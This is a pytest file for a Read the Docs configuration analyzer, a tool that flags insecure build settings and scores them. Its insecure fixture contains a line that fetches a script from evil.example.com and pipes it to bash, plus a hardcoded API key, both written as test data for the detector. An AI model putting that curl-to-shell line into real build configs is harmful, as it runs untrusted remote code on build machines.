"""Tests for ReadTheDocsAnalyzer."""

from pathlib import Path

from devai.readthedocs_analyzer import ReadTheDocsAnalyzer, ReadTheDocsFinding


INSECURE_RTD = """\
version: 2

build:
  os: ubuntu-22.04
  tools:
    python: latest
  jobs:
  build:
    commands:
      - curl -fsSL http://evil.example.com/install.sh | bash
      - pip install --trusted-host pypi.org -r requirements.txt
      - export RTD_API_KEY=hardcoded-secret-key

sphinx:
  configuration: docs/conf.py
  fail_on_warning: false

formats: all

submodules: include
"""

HARDENED_RTD = """\
version: 2

build:
  os: ubuntu-22.04
  tools:
    python: "3.12"

sphinx:
  configuration: docs/conf.py
  fail_on_warning: true

formats: []

python:
  install:
    - method: pip
      path: .
"""


class TestReadTheDocsAnalyzer:
    def test_detects_insecure_readthedocs_yaml(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(INSECURE_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "curl_pipe_shell" in kinds
        assert "pip_trusted_host" in kinds
        assert "hardcoded_secret" in kinds
        assert "fail_on_warning_false" in kinds
        assert "submodules_include" in kinds
        assert "formats_all" in kinds
        assert "unpinned_python" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_readthedocs_scores_well(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(HARDENED_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0

    def test_readthedocs_yml_also_scanned(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yml").write_text("fail_on_warning: false\n", encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert len(analyzer.config_files()) == 1
        assert any(f.kind == "fail_on_warning_false" for f in findings)

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.config_files == 0

    def test_generate_hardened_template(self):
        template = ReadTheDocsAnalyzer(".").generate_hardened_template()
        assert "fail_on_warning: true" in template
        assert 'python: "3.12"' in template

    def test_finding_format(self):
        finding = ReadTheDocsFinding(
            kind="curl_pipe_shell",
            severity="high",
            message="test message",
            path=".readthedocs.yaml",
            lineno=2,
        )
        assert "high" in finding.format()
        assert ".readthedocs.yaml:2" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text("fail_on_warning: false\n", encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Read the Docs analysis:" in context
        assert "health score:" in context

    def test_summary(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text("fail_on_warning: false\n", encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        summary = analyzer.summary()
        assert "Read the Docs configs:" in summary
        assert "1 file(s)" in summary

    def test_project_health_integration(self, tmp_path: Path):
        from devai.project_health import ProjectHealth

        (tmp_path / ".readthedocs.yaml").write_text(
            "fail_on_warning: false\nsubmodules: include\n",
            encoding="utf-8",
        )
        report = ProjectHealth(str(tmp_path)).analyze()
        rtd = next(c for c in report.categories if c.name == "readthedocs")
        assert rtd.score < 100.0
        assert rtd.details.get("findings", 0) > 0

    def test_facade_readthedocs_method(self):
        from devai.facade import DevAI

        dev = DevAI.mock()
        analyzer = dev.readthedocs(".")
        assert isinstance(analyzer, ReadTheDocsAnalyzer)
